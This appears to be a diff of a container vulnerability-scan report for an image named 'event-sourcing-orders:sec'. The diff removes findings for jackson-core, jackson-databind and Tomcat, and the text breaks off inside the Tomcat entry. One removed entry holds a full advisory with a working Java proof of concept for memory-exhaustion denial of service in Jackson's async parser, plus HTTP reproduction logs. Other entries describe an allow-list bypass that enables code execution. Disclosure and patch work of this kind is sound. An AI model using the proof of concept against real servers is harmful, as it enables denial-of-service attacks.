@@ -1,6 +1,6 @@
 {
   "SchemaVersion": 2,
-  "CreatedAt": "2026-09-15T19:28:09.506285636Z",
+  "CreatedAt": "2026-09-15T19:41:53.779036841Z",
   "ArtifactName": "event-sourcing-orders:sec",
   "ArtifactType": "container_image",
   "Metadata": {
@@ -8,7 +8,7 @@
       "Family": "ubuntu",
       "Name": "26.04"
     },
-    "ImageID": "sha256:3b756c4ca083ea51be370b24f0cd09273d08039c4389b4b3d0dc5b0916a35a44",
+    "ImageID": "sha256:d3d2fdffaca7081b555b559f07467bf0db659f2b5f505e40fd3acc5bd68332d7",
     "DiffIDs": [
       "sha256:d6b1a90bccf18353db11e206211d1438050e64d14c56a48ae067131e0a3cc245",
       "sha256:d85193ee52f1c6af3150f4f15bde65704cf6ec6f113dc3802940d62410eb8da5",
@@ -17,15 +17,15 @@
       "sha256:fd584c0b9ab42fb55891eafa181cce73c469babc6e55a31336294a368c3abcf9",
       "sha256:f19438248c3776f33a67b280659e5138dacf993c3a1167174b4991cfa9d6a315",
       "sha256:57d19823476a18d886af537fd9d89e6016757f7271ca3e13307bfa7a63de5b72",
-      "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb",
-      "sha256:81560b42c4d8ff418c4b638f456719f8c1f4bbbd0417fd219b76350bf033850a"
+      "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31",
+      "sha256:6f78cbed9d6c545c37ae96ffc0aeaab53891ea1d15181df8f8b1fe53d97fb115"
     ],
     "RepoTags": [
       "event-sourcing-orders:sec"
     ],
     "ImageConfig": {
       "architecture": "amd64",
-      "created": "2026-08-10T05:25:14.921986356Z",
+      "created": "2026-09-15T19:41:24.519427382Z",
       "history": [
         {
           "created": "2026-07-13T16:06:29.860542013Z",
@@ -122,23 +122,23 @@
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-08-10T05:25:14.79234511Z",
+          "created": "2026-09-15T19:41:24.441614555Z",
           "created_by": "COPY /app/extracted/ ./ # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-08-10T05:25:14.921986356Z",
+          "created": "2026-09-15T19:41:24.519427382Z",
           "created_by": "COPY /app/gradle/libs.versions.toml gradle/libs.versions.toml # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-08-10T05:25:14.921986356Z",
+          "created": "2026-09-15T19:41:24.519427382Z",
           "created_by": "ENV MAIN_CLASS=com.portfolio.eventsourcing.benchmark.BenchmarkRunner",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-08-10T05:25:14.921986356Z",
+          "created": "2026-09-15T19:41:24.519427382Z",
           "created_by": "ENTRYPOINT [\"sh\" \"-c\" \"exec java -cp 'BOOT-INF/classes:BOOT-INF/lib/*' \\\"$MAIN_CLASS\\\" \\\"$@\\\"\" \"--\"]",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
@@ -155,8 +155,8 @@
           "sha256:fd584c0b9ab42fb55891eafa181cce73c469babc6e55a31336294a368c3abcf9",
           "sha256:f19438248c3776f33a67b280659e5138dacf993c3a1167174b4991cfa9d6a315",
           "sha256:57d19823476a18d886af537fd9d89e6016757f7271ca3e13307bfa7a63de5b72",
-          "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb",
-          "sha256:81560b42c4d8ff418c4b638f456719f8c1f4bbbd0417fd219b76350bf033850a"
+          "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31",
+          "sha256:6f78cbed9d6c545c37ae96ffc0aeaab53891ea1d15181df8f8b1fe53d97fb115"
         ]
       },
       "config": {
@@ -197,327 +197,18 @@
       "Type": "jar",
       "Vulnerabilities": [
         {
-          "VulnerabilityID": "GHSA-r7wm-3cxj-wff9",
-          "PkgName": "com.fasterxml.jackson.core:jackson-core",
-          "PkgPath": "app/BOOT-INF/lib/jackson-core-2.18.2.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.18.2",
-            "UID": "6e43f87a3229c805"
-          },
-          "InstalledVersion": "2.18.2",
-          "FixedVersion": "2.18.8, 2.21.4",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
-          "Description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr \u003e= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr \u003e= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // \u003c-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr \u003e= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // \u003c-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) \u0026 0xFF;\n        if (ch \u003c INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch \u003e INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // \u003c-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch \u003e= INT_0 \u0026\u0026 ch \u003c= INT_9) {\n        ++fractLen;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr \u003e= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // \u003c-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc \u0026\u0026 cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat \u003e PoC.java \u003c\u003c'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i \u003c digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c \u003c 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux\u003cDataBuffer\u003e` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux\u003c...\u003e` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       \u003c- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     \u003c- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono\u003cJsonNode\u003e` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux\u003cJsonNode\u003e` / `@RequestBody Flux\u003c...\u003e` /\nWebSocket / SSE / any direct `decoder.decode(Flux\u003cDataBuffer\u003e, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr \u003e= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr \u003c maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
-          "Severity": "HIGH",
-          "VendorSeverity": {
-            "ghsa": 3
-          },
-          "CVSS": {
-            "ghsa": {
-              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
-              "V40Score": 8.7
-            }
-          },
-          "References": [
-            "https://github.com/FasterXML/jackson-core",
-            "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd",
-            "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641",
-            "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8",
-            "https://github.com/FasterXML/jackson-core/pull/1611",
-            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
-          ],
-          "PublishedDate": "2026-07-21T21:58:53Z",
-          "LastModifiedDate": "2026-08-03T20:30:41Z"
-        },
-        {
-          "VulnerabilityID": "CVE-2026-54512",
-          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
-          "PkgPath": "app/BOOT-INF/lib/jackson-databind-2.18.2.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.18.2",
-            "UID": "c48f545bf0150787"
-          },
-          "InstalledVersion": "2.18.2",
-          "FixedVersion": "2.18.8, 3.1.4, 2.21.4",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54512",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "jackson-databind: jackson-databind: Arbitrary code execution via PolymorphicTypeValidator bypass",
-          "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, jackson-databind's PolymorphicTypeValidator (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains \u003c), DatabindContext._resolveAndValidateGeneric() validates only the raw container class name (the substring before \u003c) against the configured PTV. If the container type is approved, the method parses the full canonical type string via TypeFactory.constructFromCanonical() and returns the fully parameterized type without ever validating the nested type arguments against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization. An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example java.util.ArrayList\u003ccom.evil.Gadget\u003e when only java.util.ArrayList is allow-listed. The container passes the PTV check; com.evil.Gadget is loaded via Class.forName(name, true, loader), instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.",
-          "Severity": "HIGH",
-          "CweIDs": [
-            "CWE-184",
-            "CWE-502"
-          ],
-          "VendorSeverity": {
-            "alma": 3,
-            "amazon": 3,
-            "ghsa": 3,
-            "oracle-oval": 3,
-            "redhat": 3,
-            "rocky": 3
-          },
-          "CVSS": {
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 8.1
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 8.1
-            }
-          },
-          "References": [
-            "https://access.redhat.com/errata/RHSA-2026:40895",
-            "https://access.redhat.com/errata/RHSA-2026:43400",
-            "https://access.redhat.com/security/cve/CVE-2026-54512",
-            "https://bugzilla.redhat.com/2492010",
-            "https://bugzilla.redhat.com/2492015",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
-            "https://creativecommons.org/licenses/by/4.0/",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
-            "https://errata.almalinux.org/10/ALSA-2026-43400.html",
-            "https://errata.rockylinux.org/RLSA-2026:40895",
-            "https://github.com/FasterXML/jackson-databind",
-            "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
-            "https://github.com/FasterXML/jackson-databind/issues/5988",
-            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm",
-            "https://linux.oracle.com/cve/CVE-2026-54512.html",
-            "https://linux.oracle.com/errata/ELSA-2026-43400.html",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-54512",
-            "https://www.cve.org/CVERecord?id=CVE-2026-54512"
-          ],
-          "PublishedDate": "2026-06-23T21:17:02.203Z",
-          "LastModifiedDate": "2026-06-27T21:01:36.47Z"
-        },
-        {
-          "VulnerabilityID": "CVE-2026-54513",
-          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
-          "PkgPath": "app/BOOT-INF/lib/jackson-databind-2.18.2.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.18.2",
-            "UID": "c48f545bf0150787"
-          },
-          "InstalledVersion": "2.18.2",
-          "FixedVersion": "2.18.8, 2.21.4, 3.1.4",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54513",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "jackson-databind: Jackson-databind: Security bypass allows arbitrary code execution",
-          "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray() allowlists any array type based only on clazz.isArray(), without validating the array's component (element) type against the configured allowlist. A PTV built with allowIfSubTypeIsArray() plus an explicit concrete-type allowlist therefore still permits EvilType[] even though EvilType is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.",
-          "Severity": "HIGH",
-          "CweIDs": [
-            "CWE-184"
-          ],
-          "VendorSeverity": {
-            "alma": 3,
-            "amazon": 3,
-            "ghsa": 3,
-            "oracle-oval": 3,
-            "redhat": 3,
-            "rocky": 3
-          },
-          "CVSS": {
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 8.1
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 8.1
-            }
-          },
-          "References": [
-            "https://access.redhat.com/errata/RHSA-2026:36839",
-            "https://access.redhat.com/errata/RHSA-2026:40895",
-            "https://access.redhat.com/errata/RHSA-2026:41951",
-            "https://access.redhat.com/errata/RHSA-2026:43218",
-            "https://access.redhat.com/errata/RHSA-2026:43400",
-            "https://access.redhat.com/errata/RHSA-2026:44061",
-            "https://access.redhat.com/errata/RHSA-2026:44062",
-            "https://access.redhat.com/errata/RHSA-2026:44063",
-            "https://access.redhat.com/errata/RHSA-2026:44064",
-            "https://access.redhat.com/errata/RHSA-2026:44065",
-            "https://access.redhat.com/errata/RHSA-2026:44066",
-            "https://access.redhat.com/errata/RHSA-2026:44271",
-            "https://access.redhat.com/errata/RHSA-2026:48095",
-            "https://access.redhat.com/errata/RHSA-2026:48151",
-            "https://access.redhat.com/errata/RHSA-2026:50846",
-            "https://access.redhat.com/errata/RHSA-2026:50847",
-            "https://access.redhat.com/errata/RHSA-2026:50848",
-            "https://access.redhat.com/errata/RHSA-2026:50849",
-            "https://access.redhat.com/errata/RHSA-2026:54435",
-            "https://access.redhat.com/errata/RHSA-2026:54622",
-            "https://access.redhat.com/errata/RHSA-2026:62260",
-            "https://access.redhat.com/errata/RHSA-2026:66488",
-            "https://access.redhat.com/errata/RHSA-2026:66545",
-            "https://access.redhat.com/security/cve/CVE-2026-54513",
-            "https://bugzilla.redhat.com/2492010",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
-            "https://creativecommons.org/licenses/by/4.0/",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
-            "https://errata.almalinux.org/8/ALSA-2026-43218.html",
-            "https://errata.rockylinux.org/RLSA-2026:40895",
-            "https://github.com/FasterXML/jackson-databind",
-            "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
-            "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
-            "https://github.com/FasterXML/jackson-databind/issues/5981",
-            "https://github.com/FasterXML/jackson-databind/issues/5983",
-            "https://github.com/FasterXML/jackson-databind/pull/5984",
-            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-rmj7-2vxq-3g9f",
-            "https://linux.oracle.com/cve/CVE-2026-54513.html",
-            "https://linux.oracle.com/errata/ELSA-2026-43400.html",
-            "https://nvd.nist.gov/vuln/detail/CVE-2026-54513",
-            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54513.json",
-            "https://www.cve.org/CVERecord?id=CVE-2026-54513"
-          ],
-          "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-09-14T13:18:40.63Z"
-        },
-        {
-          "VulnerabilityID": "CVE-2025-24813",
-          "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
-          },
-          "InstalledVersion": "10.1.33",
-          "FixedVersion": "11.0.3, 10.1.35, 9.0.99",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-24813",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
